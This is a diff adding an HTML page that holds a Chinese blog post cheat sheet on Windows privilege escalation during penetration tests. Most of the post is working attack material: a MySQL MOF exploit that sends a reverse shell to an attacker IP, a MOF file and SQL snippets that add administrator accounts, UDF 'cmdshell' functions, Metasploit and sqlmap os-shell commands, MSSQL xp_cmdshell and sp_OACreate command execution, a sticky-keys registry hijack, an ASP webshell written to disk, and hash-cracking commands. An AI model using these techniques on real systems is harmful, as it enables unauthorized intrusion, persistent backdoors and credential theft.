@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="提权,">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透提权windows篇">
+<meta property="og:url" content="http://yoursite.com/2018/08/29/渗透提权windows篇/index.html">
+<meta property="og:site_name" content="WBGlIl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/07/21/5d34861900fe027917.png">
+<meta property="og:updated_time" content="2019-07-21T15:45:57.053Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透提权windows篇">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/21/5d34861900fe027917.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/29/渗透提权windows篇/">
+
+
+
+
+
+  <title>渗透提权windows篇 | WBGlIl</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WBGlIl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/29/渗透提权windows篇/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WBGlIl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WBGlIl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透提权windows篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-29T14:30:35+08:00">
+                2018-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.loli.net/2019/07/21/5d34861900fe027917.png" alt></p>
+<a id="more"></a>
+<h1 id="Windows提权总结"><a href="#Windows提权总结" class="headerlink" title="Windows提权总结"></a>Windows提权总结</h1><p><strong>关于常用命令请看常用命令.md</strong></p>
+<h2 id="1-本地提权"><a href="#1-本地提权" class="headerlink" title="1. 本地提权"></a>1. 本地提权</h2><p>windows系统被爆出了很多提权漏洞，通常来说及时打补丁就能防止黑客在本地利用漏洞提权。换言之就是没打补丁就能提权，另外windows平台上许多软件也被爆出提权漏洞，所以说枚举目标机上打了哪些补丁、操作系统的版本以及安装了哪些软件对于利用漏洞提权来说十分重要。对于有安装杀软服务器要进行免杀。<strong>基本就是分为远程溢出和本地溢出</strong>其中远程溢出如果对方端口不对外开放可以通过代理打过去如445端口,本地溢出一般就是使用exp<br>一些常用命令:</p>
+<pre>
+systemifo 获取系统配置信息  
+wmic os get caption 获取系统版本
+wmic qfe get Description,HotFixID,InstalledOn 枚举安装的补丁  
+powershell Get-HotFix 利用powershell获取安装的补丁
+powershell "Get-WmiObject -Class Win32_Product | Select-Object -Property Name" 获取安装的软件
+</pre>
+
+<p>一些常用工具:<br><a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a><br><a href="https://github.com/alpha1ab/CVE-2018-8120" target="_blank" rel="noopener">https://github.com/alpha1ab/CVE-2018-8120</a><br><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a><br><a href="https://github.com/5z1punch/GetRoot-Tools" target="_blank" rel="noopener">https://github.com/5z1punch/GetRoot-Tools</a><br><a href="https://github.com/xiaoxiaoleoWindows_Privilege_Escalation" target="_blank" rel="noopener">https://github.com/xiaoxiaoleoWindows_Privilege_Escalation</a><br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/nixawk/labs" target="_blank" rel="noopener">https://github.com/nixawk/labs</a><br><a href="https://github.com/breenmachine/RottenPotatoNG" target="_blank" rel="noopener">https://github.com/breenmachine/RottenPotatoNG</a><br><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato</a><br><a href="https://github.com/Kevin-Robertson/Tater" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Tater</a><br><a href="https://github.com/Rootkitsmm/Win10Pcap-Exploit" target="_blank" rel="noopener">https://github.com/Rootkitsmm/Win10Pcap-Exploit</a><br><a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">https://github.com/AlessandroZ/BeRoot</a><br><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato</a>  </p>
+<h2 id="2-常见服务提权"><a href="#2-常见服务提权" class="headerlink" title="2. 常见服务提权"></a>2. 常见服务提权</h2><p><strong>mysql mssql oracle Ftp vnc postgresql等等服务</strong>  </p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>Mysql默认端口是3306端口，但也可以自定义端口可以通过扫描,查找连接数据库配置文件,netstat -aon,等等查看端口<br>关于mysql提权首先应该是找到密码，这个可以通过数据库配置文件或通过mysql目录下的data\mysql\user.MYD文件中查看mysql用户的hash值进行破解<br>一.MOf提权<br>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit<a href="https://www.exploit-db.com/exploits/23083/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/23083/</a>，简称mysql远程提权0day(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：</p>
+<pre>
+方法1：运行 MOF 文件指定为命令行参数 Mofcomp.exe 文件。
+方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。
+方法3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。
+</pre>
+<p>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用IMofCompiler::CompileFile方法。第三种方法仅为向后兼容性与早期版本的 WMI提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下，否则会失败！</p>
+<p>该漏洞的利用前提条件是必须具备mysql的root权限，在Kingcope公布的0day中公布了一个pl利用脚本。</p>
+<pre>
+perl mysql_win_remote.pl 192.168.2.100 root "" 192.168.2.150 5555
+</pre>
+<p>192.168.2.100为mysql数据库所在服务器，mysql口令为空，反弹到192.168.2.150的5555端口上。<br>2.生成nullevt.mof文件:</p>
+<p></p>
+将以下代码保存为nullevt.mof文件：
+
+<pre>
+<code>
+#pragma namespace("\\\\.\\root\\subscription") 
+
+instance of __EventFilter as $EventFilter
+
+{ 
+
+EventNamespace = "Root\\Cimv2"; 
+
+Name  = "filtP2"; 
+
+    Query = "Select \ From __InstanceModificationEvent " 
+
+            "Where TargetInstance Isa \"Win32_LocalTime\" " 
+
+            "And TargetInstance.Second = 5"; 
+
+QueryLanguage = "WQL"; 
+
+}; 
+
+
+
+instance of ActiveScriptEventConsumer as $Consumer 
+
+{ 
+
+    Name = "consPCSV2"; 
+
+ScriptingEngine = "JScript"; 
+
+ScriptText = 
+
+    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add")"; 
+
+}; 
+
+instance of __FilterToConsumerBinding
+
+{ 
+
+    Consumer   = $Consumer; 
+
+    Filter = $EventFilter; 
+
+};
+<code>
+</code></code></pre>  
+
+<p><strong>3.通过Mysql查询将文件导入</strong><br>执行以下查询语句，将上面生成的nullevt.mof导入到c:\windows\system32\wbem\mof\目录下在windows7中默认是拒绝访问的。导入后系统会自动运行，执行命令。  </p>
+<pre>
+selectload_file('C:\\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
+</pre>
+
+<p><strong>4.Msf直接mof提权</strong><br>Msf下的exploit/windows/mysql/mysql_mof模块提供了直接Mof提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p>
+<pre>
+use exploit/windows/mysql/mysql_mof
+set rhost 192.168.157.1 //设置需要提权的远程主机IP地址
+set rport 3306 //设置mysql的远程端口
+set password root //设置mysql数据库root密码
+set username root //设置mysql用户名
+options //查看设置
+run 0
+</pre>
+
+<p><strong>5.关于远程连接</strong><br>要是能够通过网页连接管理（phpmyadmin），则可以修改host为%并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。</p>
+<p>方法1：本地登入mysql，更改 mysql数据库里的 user 表里的 host项，将localhost改为%</p>
+<pre>
+use mysql;
+update user set host = '%' where user = 'root';
+FLUSH PRIVILEGES ;
+select host, user from user;
+</pre>
+<p>方法2：直接授权(推荐)<br>从任何主机上使用root用户，密码：you password（你的root密码）连接到mysql服务器：</p>
+<pre>
+mysql -u root -proot
+GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'you password' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+</pre>
+
+<p>推荐重新增加一个用户，在实际测试过程中发现很多服务器使用root配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改root配置</p>
+<p><strong>二UDF提权</strong></p>
+<p>udf提权是利用mysql自定义函数功能<br>UDF提权条件</p>
+<p>(1).Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
+<p>(2).Mysql版本小于5.1版本。udf.dll文件可放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32，或者放到盘符的根目录下通过c:udf.dll来使用</p>
+<p>(3).掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以</p>
+<p>(4).可以将udf.dll写入到相应目录的权限  </p>
+<p>(5).在MYSQL 4.1以前的版本中，可以将所有的DLL文件里面的任何函数都注册到MYSQL里面以供MYSQL调用。无论这个DLL在什么位置，函数的声明是什么样的。  </p>
+<p>(6).在MYSQL 4.1及以后的版本中，对UDF函数进行了限制，只有实现了一个特定接口的函数才可以被成功注册到MYSQL中，这样就防止了通过MYSQL非法调用系统的DLL<br>先获取mysql信息</p>
+<pre>
+select version();//获取数据库版本
+select user();//获取数据库用户
+select @@basedir ;//获取安装目录
+show variables like '%plugins%';
+</pre>
+<p>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数。<br>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建libplugin文件夹，<br>然后将udf.dll文件导出到该目录即可<br>网上大牛发现利用NTFS ADS流来创建文件夹的方法：</p>
+<pre>
+select @@basedir;  //查找到mysql的目录
+select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录
+</pre>
+
+<p>如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下。<br>可以通过show variables like ‘%secure%’;查询secure-file-priv的值。<br>使用#注释掉mysql安装目录下my.ini 或者mysql.cnf中的secure_file_priv=”c:/tmp”一行，然后重启mysql就可以将文件导出到任意目录了</p>
+<p><strong>创建函数</strong>  </p>
+<pre>
+create function cmdshell returns string soname "path_dll"
+</pre>
+
+<p><strong>执行命令</strong>  </p>
+<pre>
+select cmdshell('whoami');
+</pre>
+
+<p><strong>删除函数</strong>  </p>
+<pre>
+drop function cmdshell;
+</pre>
+
+<p>关于udf.dll可以使用sqlmap中或自己编译或直接用udf.php等等</p>
+<p><strong>sqlmap直连数据库提权</strong>  </p>
+<p>Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下<br> (1)连接数据库</p>
+<pre>
+sqlmap -d "mysql://root:root@127.0.0.1:3306/mysql" --os-shell
+</pre>
+
+<p>（2）选择操作系统的架构，32位操作系统选择1，64位选择2.  </p>
+<p>（3）自动上传udf或提示os-shell  </p>
+<p>（4）执行whomai命令如果获取系统权限，则表示提权成功</p>
+<p><strong>msfudf提权</strong></p>
+<pre>
+use exploit/windows/mysql/mysql_payload
+options
+set rhost 192.168.2.1
+set rport 3306
+set username root
+set password 123456
+exploit
+</pre>
+
+<p>msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功</p>
+<p><strong>Msf其它相关漏洞提权</strong><br>1.Mysql身份认证漏洞及利用(CVE-2012-2122)</p>
+<p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，<br>会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。<br>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。<br>按照公告说法大约256次就能够蒙对一次。<br>受影响的产品： All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞.</p>
+<p>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23不存在漏洞.<br>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not不存在漏洞.</p>
+<pre>
+auxiliary/scanner/mysql/mysql_authbypass_hashdump
+exploit/windows/mysql/mysql_yassl_hello
+exploit/windows/mysql/scrutinizer_upload_exec
+</pre>
+
+<h2 id="mysql密码破解"><a href="#mysql密码破解" class="headerlink" title="mysql密码破解"></a>mysql密码破解</h2><p><strong>cain工具破解mysql密码</strong><br>使用UltraEdit-32编辑器直接打开user.MYD文件，打开后使用二进制模式进行查看，<br>在root用户后面是一串字符串，选中这些字符串将其复制到记事本中，<br>这些字符串即为用户加密值，例如506D1427F6F61696B4501445C90624897266DAE3。</p>
+<p>注意：<br>（1）root后面的“”不要复制到字符串中。</p>
+<p>（2）在有些情况下需要往后面看看，否则得到的不是完整的MYSQLSHA1密码，总之其正确的密码位数是40位。</p>
+<p>安装cain工具，使用cracker，右键单击“Add tolist”将Mysql Hashes值加入到破解列表中，使用软件中的字典、暴力破解等方式来进行暴力破解。<br><strong>网站在线密码破解</strong><br><a href="cmd5.com">cmd5.com</a><br><a href="www.somd5.com">www.somd5.com</a><br><a href="https://www.mysql-password.com/" target="_blank" rel="noopener">https://www.mysql-password.com/</a><br><strong>oclhash破解</strong><br>hashcat支持很多种破解算法，免费开源软件，官方网站<a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">https://hashcat.net/hashcat</a><br>破解命令：</p>
+<p>hashcat64.exe -m 200myql.hashpass.dict //破解MySQL323类型</p>
+<p>hashcat64.exe -m 300myql.hashpass.dict //破解MySQL4.1/MySQL5类型</p>
+<p><strong>John the Ripper password cracker</strong><br>John the Ripper下载地址：<a href="http://www.openwall.com/john/h/john179w2.zip" target="_blank" rel="noopener">http://www.openwall.com/john/h/john179w2.zip</a>，John the Ripper除了能够破解linux外，还能破解多种格式的密码如linux登陆密码</p>
+<pre>
+Echo 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B>hashes.txt
+John –format =mysql-sha1 hashes.txt
+john --list=formats | grep mysql //查看支持mysql密码破解的算法
+</pre>
+
+<p><a href="https://github.com/Feng4/-/tree/master/php" target="_blank" rel="noopener">https://github.com/Feng4/-/tree/master/php</a><br><a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">https://github.com/v5est0r/Python_FuckMySQL</a><br><a href="http://https://github.com/MaYaSeVeN/CVE-2016-6662" target="_blank" rel="noopener">http://https://github.com/MaYaSeVeN/CVE-2016-6662</a><br><a href="https://github.com/firebroo/CVE-2016-6663" target="_blank" rel="noopener">https://github.com/firebroo/CVE-2016-6663</a>  </p>
+<h2 id="mssql-SQLServer"><a href="#mssql-SQLServer" class="headerlink" title="mssql(SQLServer)"></a>mssql(SQLServer)</h2><p>mssql提权<br>常用一点的</p>
+<pre>
+exec master..xp_cmdshell "whoami"
+</pre>
+
+<p>但默认情况下xp_cmdshell 是禁止的可以使用以下命令恢复</p>
+<pre>
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; --开启xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE; --关闭xp_cmdshell
+EXEC sp_configure 'show advanced options', 0;RECONFIGURE; --关闭show advanced options(关闭高级选项)
+</pre>
+
+<p>如果xp_cmdshell被删除，可以重新加载</p>
+<pre>
+dbcc addextendedproc("xp_cmdshell","xplog70.dll")
+</pre>
+<p>如果xplog70.dll文件被删可以尝试上传xplog70.dll进行恢复，恢复语句：  </p>
+<pre>
+Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+</pre>
+
+<p><strong>2.SP_OACREATE</strong>  </p>
+<p>当xp_cmdshell 删除以后，也可以使用SP_OACreate。<br>首先要打开组件：</p>
+<pre>
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE; --开启
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',0;RECONFIGURE; --关毕
+EXEC sp_configure 'show advanced options', 0;RECONFIGURE; --关闭show advanced options(关闭高级选项)
+如果还不能运行可能是管理员删除了组件
+恢复组件:
+dbcc addextendedproc("sp_OACreate","odsole70.dll")  
+</pre>
+
+<p>常用sql语句  </p>
+<p>sp_OACreate删除文件  </p>
+<pre>
+DECLARE @Result int
+DECLARE @FSO_Token int
+EXEC @Result = sp_OACreate 'Scripting.FileSystemObject', @FSO_Token OUTPUT
+EXEC @Result = sp_OAMethod @FSO_Token, 'DeleteFile', NULL, 'C:\1.txt'
+EXEC @Result = sp_OADestroy @FSO_Token
+</pre>
+
+<p>sp_OACreate复制文件  </p>
+<pre>
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+</pre>
+
+<p>sp_OACreate移动文件  </p>
+<pre>
+declare @aa int
+exec sp_oacreate 'scripting.filesystemobject', @aa out
+exec sp_oamethod @aa, 'moveFile',null,'c:\temp\ipmi.log', 'c:\temp\ipmi1.log';
+</pre>
+
+<p>sp_OACreate加管理员用户  </p>
+<pre>
+DECLARE @js int
+EXEC sp_OACreate 'ScriptControl',@js OUT
+EXEC sp_OASetProperty @js, 'Language', 'JavaScript'
+EXEC sp_OAMethod @js, 'Eval', NULL, 'var o=new ActiveXObject("Shell.Users");z=o.create("user");z.changePassword("pass","");z.setting("AccountType")=3;'
+</pre>
+
+<p><strong>3.sp_makewebtask</strong><br>开启和关闭</p>
+<pre>
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE; --开启
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',0;RECONFIGURE; --关毕
+EXEC sp_configure 'show advanced options', 0;RECONFIGURE; --关闭show advanced options(关闭高级选项)
+</pre>
+<p>写文件</p>
+<pre>
+exec sp_makewebtask 'c:\www\testwr.asp','select''<%25execute(request("ok"))%25>'' ';
+</%25execute(request("ok"))%25></pre>
+
+<p><a href="https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-server-2005/ms175576(v=sql.90)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-server-2005/ms175576(v=sql.90)</a><br>这里我配置Web Assistant Procedures失败(也可能是我本地环境的问题)<br><strong>命令执行</strong><br>wscript.shell</p>
+<pre>
+use master
+declare @o int
+exec sp_oacreate 'wscript.shell',@o out
+exec sp_oamethod @o,'run',null,'cmd /c whoami > C:\1.txt'
+</pre>
+<p>没有回显  </p>
+<p>shell.Application</p>
+<pre>
+declare @o int
+exec sp_oacreate 'Shell.Application',@o out
+exec sp_oamethod @o, 'ShellExecute',null,'cmd.exe','cmd /c net user >C:\1.txt','C:\windows\sytsem32\','','1';
+</pre>
+<p>这里我在sql server 2008 windows10上启动程序成功但并没有生成1.txt可能是没有执行命令行  </p>
+<pre>
+exec sp_oamethod @o, 'ShellExecute',null,'user.vbs','','c:\','','1';
+</pre>
+
+<p><strong>沙盒命令执行</strong><br>利用<code>jet.oledb</code>执行系统命令</p>
+<pre>
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami")')
+</pre>
+
+<p>默认不行<br>关闭系统沙盒模式，它在注册表的位置是<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\Engine\SandBoxMode</code><br>默认键值为<code>3</code>，即只在<code>Access</code>的模式下开启沙盒模式，对应的键值是</p>
+<p><code>0</code>：在任何所有者中禁止启用安全模式<br><code>1</code> ：为仅在允许范围内<br><code>2</code> ：必须在access模式下<br><code>3</code> ：完全开启<br>将其设置为0就可以关闭系统沙盒模式了</p>
+<pre>
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+</pre>
+
+<p>然后利用<code>jet.oledb</code>执行系统命令whoami:</p>
+<pre>
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami >C:\1.txt")')
+</pre>
+
+<p>无回显<br><strong>注册表映像劫持</strong><br>先恢复注册表的存储过程</p>
+<pre>
+exec sp_addextendedproc xp_regwrite,'xpstar.dll'
+</pre>
+
+<p>映像劫持</p>
+<pre>
+exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_SZ','c:\windows\system32\cmd.exe'
+</pre>
+
+<p>直接执行不行要16进制编码</p>
+<pre>
+exec xp_regwrite 0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\\windows\\system32\\taskmgr.exe
+</pre>
+
+<p>sp_oacreate</p>
+<pre>
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+</pre>
+
+<p><strong>SQL Server CLR</strong><br><a href="https://xz.aliyun.com/t/248#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/248#toc-7</a>  </p>
+<pre>
+Xp_availablemedia          显示机器上有用的驱动器 
+xp_enumgroups              列出当前系统的使用群组及其说明
+Xp_dirtree                 允许获得一个目录树 
+Xp_enumdsn                 列举服务器上的ODBC数据源 
+Xp_loginconfig             获取服务器安全信息 
+Xp_makecab                 允许用户在服务器上创建一个压缩文件 
+Xp_ntsec_enumdomains       列举服务器可以进入的域 
+Xp_terminate_process       提供进程的进程ID，终止此进程 
+xp_servicecontrol          允许用户启动，停止服务
+xp_regread                 存储过程修改注册表
+xp_getfiledetails          获取某文件的相关属性
+xp_cmdshell                执行命令
+</pre>
+
+<p>判断组件是否存在</p>
+<pre>
+SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'
+</pre>
+
+<p>恢复sp_addextendedproc</p>
+<pre>
+Use master
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */
+@dllname varchar(255)/* name of DLL containing function */
+as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+</pre>
+
+<p>sp_addextendedproc恢复各种扩展</p>
+<pre>
+EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
+EXEC sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
+EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
